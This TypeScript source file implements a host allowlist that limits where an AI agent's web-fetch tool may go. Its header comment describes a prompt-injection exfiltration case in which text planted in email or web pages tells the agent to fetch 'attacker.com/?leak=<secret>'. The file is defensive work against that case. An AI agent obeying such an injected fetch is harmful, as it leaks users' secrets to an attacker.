// Per-host allowlist for outbound web fetches. With the agent reading
// untrusted content (email, web pages), an open WebFetch is an exfiltration
// channel — the attacker doesn't need shell, they just inject "fetch
// attacker.com/?leak=<secret>". The fix is to bound where WebFetch can go.
//
// Matching rules (intentionally simple — easier to audit than to outsmart):
//   • Exact host:   "wikipedia.org"            ⇢ matches host === "wikipedia.org"
//   • Wildcard:     "*.wikipedia.org"          ⇢ matches any sub-domain
//   • Bare prefix:  "wikipedia.org"            ⇢ also matches subdomains (en.wikipedia.org)
//
// We accept either bare or wildcard form so the config file is forgiving;
// the matcher always honours the subdomain rule (a domain entry covers its
// subdomains, never its parent).
//
// Out of scope on purpose:
//   • Path-level allowlisting — query strings are how exfil is encoded, but a
//     host gate already kills the "attacker.com" route. Per-path rules add
//     complexity without buying much against the same threat.
//   • Punycode / IDN normalisation — Node's URL parser already lowercases and
//     decodes; we rely on that.

const NULL_HOSTS = new Set(['', 'localhost', '127.0.0.1', '::1']);

/** Parse a URL string and return its lowercased hostname, or null on failure. */
export function urlHost(url: string): string | null {
  try {
    const u = new URL(url);
    if (u.protocol !== 'http:' && u.protocol !== 'https:') return null;
    // Node returns IPv6 hosts bracketed ("[::1]"). Strip for the loopback
    // check; everything else compares lowercase-normalised.
    const host = u.hostname.toLowerCase().replace(/^\[|\]$/g, '');
    if (NULL_HOSTS.has(host)) return null; // never trust loopback as "approved"
    return host;
  } catch {
    return null;
  }
}

function entryMatches(host: string, entry: string): boolean {
  const e = entry.trim().toLowerCase();
  if (!e) return false;
  if (e.startsWith('*.')) {
    const suffix = e.slice(2);
    return host === suffix || host.endsWith('.' + suffix);
  }
  // Bare entry: exact match, or host ends with ".<entry>" (subdomain).
  return host === e || host.endsWith('.' + e);
}

/** True if the URL's host matches any entry in the allowlist. */
export function urlAllowed(url: string, allowlist: string[]): boolean {
  const host = urlHost(url);
  if (host === null) return false;
  return allowlist.some((entry) => entryMatches(host, entry));
}
